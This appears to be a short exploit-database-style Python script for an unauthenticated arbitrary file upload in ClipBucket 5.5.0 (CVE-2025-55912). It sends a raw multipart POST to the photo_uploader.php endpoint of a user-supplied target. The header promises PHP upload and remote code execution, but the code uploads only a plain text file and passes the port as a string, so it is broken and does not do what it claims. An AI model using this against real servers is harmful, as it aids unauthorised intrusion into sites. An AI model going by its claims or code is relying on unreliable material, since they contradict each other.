#maked by kockerpro94
# Exploit Title: ClipBucket 5.5.0 - Arbitrary File Upload

# Google Dork: N/A

# Date: 2025-09-11

# Exploit Author: Mukundsinh Solanki (r00td3str0y3r)

# Vendor Homepage: https://clipbucket.com

# Software Link: https://github.com/MacWarrior/clipbucket-v5

# Version: <= 5.5.0

# Tested on: Ubuntu 20.04 LTS, PHP 7.4

# CVE: CVE-2025-55912

## Vulnerability Description:
# ClipBucket <= 5.5.0 suffers from an unauthenticated arbitrary file upload
# vulnerability in `upload/actions/photo_uploader.php`. Missing access
# controls and insufficient validation of uploaded files allow an attacker to
# upload a crafted PHP file and execute it remotely, leading to full remote
# code execution (RCE).
import socket

ip = input("what is the target domain: ")   # target IP
port = input("what is the port of the target: ")             # target port

# --- socket init ---
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

# --- build request ---
req = ""
req += "POST /upload/actions/photo_uploader.php HTTP/1.1\r\n"
req += f"Host: {ip}\r\n"
req += "Content-Type: multipart/form-data; boundary=----BOUND\r\n"
req += "\r\n"
req += "------BOUND\r\n"
req += "Content-Disposition: form-data; name=\"Filedata\"; filename=\"example.txt\"\r\n"
req += "Content-Type: text/plain\r\n"
req += "\r\n"
req += "Sample safe content.\r\n"
req += "------BOUND--\r\n"

# --- send the request built in `req` ---
s.send(req.encode())

# --- receive response ---
resp = s.recv(4096)
print(resp.decode(errors="ignore"))

s.close()

